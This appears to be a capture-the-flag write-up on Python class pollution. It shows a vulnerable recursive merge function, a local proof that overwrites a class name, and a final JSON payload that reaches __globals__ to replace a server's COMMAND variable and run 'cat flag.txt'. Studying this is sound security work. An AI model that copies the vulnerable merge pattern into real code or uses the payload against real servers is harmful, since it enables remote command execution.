<h1> Class Injection Python </h1>
<h2> Description : </h2>

<p> The <b>class injection vulnerability</b> in <i>Python</i> is a new vulnerability (2023) inspired by prototype pollution in Javascript. This injection allows an attackers to <b>rewrite the attributs of a vulnerable class</b> and use special attributes such as (<i>__init__,__base__,__class__,__globals__,etc...</i>) to be used to modify the operation of the object and in some case <b>overwrite variables outside</b> the polluted class. The impact of such an injection depends on the application, but can lead to causing a <b>DoS, rewriting important attributes (eg: isAdmin), or as in our case modify command executed by the server. </b>
</p>

<h2> Exploitation : </h2>

<h3> Source code review : </h3>

<p>The source code is an administration panel that updates the server's security parameters by loading the attributes of the <i>SecurityConfig</i> class into the config.json file, which is used in the <i><b>./security_config.sh config.json</b></i> command.</p>

<img src=img/class.png></img>

<ul>
  <li>We can see that our input must be in JSON format : </br>
  <img src=img/code_source1.png></img></li></br>
  <li>Our input is put to the SecurityConfig class using the recursive merge function (who can reminds us the prototype pollution in JS) : </br>
  <img src=img/merge_fonction.png></img></li>
</ul>


<h3> Injection test :  </h3>
<p>
In the source code, we can see that the conditions for a class injection are verified:
<ul>
  <li> The server uses the user input for the key and the value of an attribute without any filtering/sanitisation.</li></br>

  <li> The application uses a vulnerable recursive function which increases the criticality of the injection.</li>
</ul>

To check the presence of injection we can test locally to rewrite the name of the class using the <i>__class__.__qualname__</i> attribute.


```python3

import os, sys, json
from urllib.parse import unquote

# security config class
class SecurityConfig:
    def __init__(self, default_config=None):
        if default_config is None:
            default_config = {}
        for key, value in default_config.items():
            setattr(self, key, value)

# merge two configuration files
def merge_config(src, dst):
    for key, value in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(key) and isinstance(value, dict):
                merge_config(value, dst.get(key))
            else:
                dst[key] = value
        elif hasattr(dst, key) and isinstance(value, dict):
            merge_config(value, getattr(dst, key))
        else:
            setattr(dst, key, value)

# the default security config
default_security_config = {
    "firewall_enabled": True,
    "encryption_level": "high",
    "audit_logging": False
}

security_config = SecurityConfig(default_security_config)


user_config = json.loads(unquote('{"__class__" : {"__qualname__" : "polluted"}}'))

merge_config(user_config, security_config)
print(security_config)
```

```bash
$ python3 aide.py
<__main__.polluted object at 0x7f6adbab5950>
```

And we can see that the name of the class has been overwrite. ! </p>

<h3> Search for RCE : </h3>

<p>
Now that we have an injection class, we want to find a way of executing commands to read the flag in /tmp/flag.txt. As we know, for the application to update its security parameters, the server executes a command using the popen function in the os module. So we need to find a way of rewriting the COMMAND variable so that we can inject arbitrary commands. In the <a href=https://docs.python.org/3/reference/datamodel.html>python documentation</a> on attribute we can find an interesting attribute: <i>__globals__</i></p>

<p> Input : <i>{"__init__" : {"__globals__" : {"COMMAND" : "cat flag.txt"}}}</i>

<img src=img/poc.png></img>
